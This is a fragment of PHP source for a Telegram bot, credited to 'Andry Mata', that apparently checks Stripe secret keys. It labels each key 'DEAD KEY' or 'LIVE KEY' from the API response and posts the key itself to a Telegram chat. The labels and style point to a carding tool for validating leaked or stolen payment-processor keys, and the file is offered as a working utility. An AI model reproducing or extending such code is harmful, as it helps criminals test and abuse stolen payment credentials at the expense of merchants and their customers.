sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot Made by: Andry Mata </b>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot Made by: Andry Mata </b>");
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot Made by: Andry Mata </b>");
}}


////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}

////////////////=============[Andry Mata]===============////////////////
////////==========[Used api raw bot of @Zeltraxrockzzz]============////////

?>
